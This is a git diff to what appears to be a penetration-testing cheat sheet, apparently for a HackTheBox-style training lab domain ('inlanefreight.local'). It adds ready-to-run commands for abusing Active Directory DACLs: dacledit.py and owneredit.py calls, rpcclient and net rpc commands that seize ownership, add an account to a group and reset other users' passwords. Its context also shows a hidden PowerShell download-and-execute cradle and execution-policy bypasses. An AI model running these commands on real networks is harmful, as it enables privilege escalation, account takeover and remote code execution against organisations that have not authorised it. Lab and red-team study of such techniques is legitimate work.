@@ -591,7 +591,7 @@ powershell.exe -nop -w hidden -c "IEX(New-Object System.Net.WebClient).DownloadS
 
 # Unrestricted
 powershell -ep bypass
-Set-ExecutionPolicy Bypass -Force
+Set-ExecutionPolicy Bypass -Force -Scope Process
 ```
 ### Client Soft
 ```bash
@@ -1269,6 +1269,9 @@ Ghostpack
 ```
 
 ### Abuse DACLs
+https://github.com/ShutdownRepo/impacket
+https://raw.githubusercontent.com/ShutdownRepo/impacket/dacledit/examples/dacledit.py
+
 Set SPN
 GenericAll, GenericWrite, WriteProperty, WriteSPN, Validated-SPN 
 ```powershell
@@ -1287,7 +1290,35 @@ Set-ADAccountPassword target_user -NewPassword $((ConvertTo-SecureString 'Passwo
 net rpc password target_user 'Password123!' -U inlanefreight.local/own_user%'Password1' -S 10.129.205.81
 
 # rpcclient
+rpcclient -U INLANEFREIGHT/own_user%Password1 10.129.205.81
 setuserinfo2 target_user 23 Password123!
+```
+WriteDACL
+```bash
+# Group Add
+python3 examples/dacledit.py -principal own_user -target "Managers" -dc-ip 10.129.205.81 inlanefreight.local/own_user:Password1 -action write
+
+net rpc group addmem "Managers" "own_user" -U inlanefreight.local/own_user%Password1 -S 10.129.205.81
+
+# Password Reset
+python3 examples/dacledit.py -principal own_user -target "kenta" -dc-ip 10.129.205.81 inlanefreight.local/own_user:Password1 -action write
+
+rpcclient -U INLANEFREIGHT/own_user%Password1 10.129.205.81
+setuserinfo2 kenta 23 Password1
+```
+
+Own Target
+```bash
+python3 examples/dacledit.py -principal own_user -target "Managers" -dc-ip 10.129.205.81 inlanefreight.local/own_user:Password1 -action 'write' -rights 'WriteMembers'
+
+net rpc group addmem "Managers" "own_user" -U inlanefreight.local/own_user%Password1 -S 10.129.205.81
+```
+
+WriteOwner
+```bash
+python3 examples/owneredit.py -action write -new-owner own_user -target target_user -dc-ip 10.129.205.81 inlanefreight.local/own_user:Password1
+
+python3 examples/dacledit.py -principal own_user -target target_user -dc-ip 10.129.205.81 inlanefreight.local/own_user:Password1 -action write
 ```
 
 ### LOLBIN
